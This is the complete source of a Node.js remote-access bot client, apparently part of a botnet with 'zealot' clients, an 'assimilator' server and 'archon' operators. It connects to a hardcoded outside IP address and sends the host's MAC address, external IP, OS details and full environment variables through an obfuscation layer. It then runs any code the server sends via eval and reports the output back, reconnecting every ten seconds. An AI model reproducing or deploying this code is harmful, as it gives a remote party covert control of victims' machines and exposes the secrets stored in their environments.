'use strict'

const ASSIMILATOR_HOST = '52.38.225.69'
// const ASSIMILATOR_HOST = 'localhost'
const ASSIMILATOR_PORT = 9026
const CHECKIN_INTERVAL = 10000
const INPUT_TIMEOUT = 60000

const net = require('net')
const uuid = require('node-uuid')
const getMac = require('getmac').getMac
const obfuscator = require('./o')
const socket = net.Socket()
const getIP = require('external-ip')()
var o

getIP((err, ip) => {
  ip = ip || 'unknown'
  getMac((err, mac) => {
    const zealotID = `Z-${mac || uuid.v4()}`

    const state = {
      connection: 'DOWN',
      hasResponse: false,
      lastInputTime: Date.now()
    }

    setInterval(() => {
      if (state.connection == 'UP') {
        if (Date.now() - state.lastInputTime > INPUT_TIMEOUT) {
          disconnect()
        }
      } else if (state.connection == 'DOWN') {
        connect()
      }
    }, CHECKIN_INTERVAL)

    function checkIn() {
      // TODO more useful stuff here?
      let info = {
        mac: mac,
        ip: ip,
        platform: process.platform,
        env: process.env,
        version: require('os').release()
      }

      let msg = {zealotID: zealotID, info: info}
      o.e(msg, data => {
        socket.write(data)
      })
    }

    socket.on('data', data => {
      o.d(data, msg => {
        if (msg.exec) {
          //
          // eval each instruction
          // send output data to respective archons
          //
          state.lastInputTime = Date.now()

          var kind = 'stdout'
          var data
          try {
            data = eval(msg.exec)
          } catch (e) {
            kind = 'stderr'
            data = `${e}`
          }

          if (data !== undefined) {
            let response = {
              zealotID: zealotID,
              archonID: msg.archonID,
              output: {
                kind: kind,
                data: data
              }
            }

            o.e(response, data => {
              socket.write(data, error => {
                if (error) {
                  // oops
                  // console.error(error)
                }
              })
            })
          }

          state.hasResponse = true
        } else {
          // no exec
          if (!state.hasResponse) {
            // we had nothing in our buffer
            // disconnect immediately
            disconnect()
          }
        }
      })
    })

    socket.on('connect', () => {
      state.connection = 'UP'
      o = obfuscator.create()
      checkIn()
    })

    var connectDelay = 100
    function connect() {
      state.connection = 'CONNECTING'
      socket.connect({
        host: ASSIMILATOR_HOST,
        port: ASSIMILATOR_PORT
      })
    }


    socket.on('end', () => {
      state.connection = 'DOWN'
    })

    function disconnect() {
      state.connection = 'DISCONNECTING'
      state.hasResponse = false
      socket.end()
    }

    socket.on('error', (error) => {
      // console.error(error)
      if (socket.state == 'UP') {
        disconnect()
      } else {
        state.connection = 'DOWN'
      }
    })

    // start
    connect()
  })
})
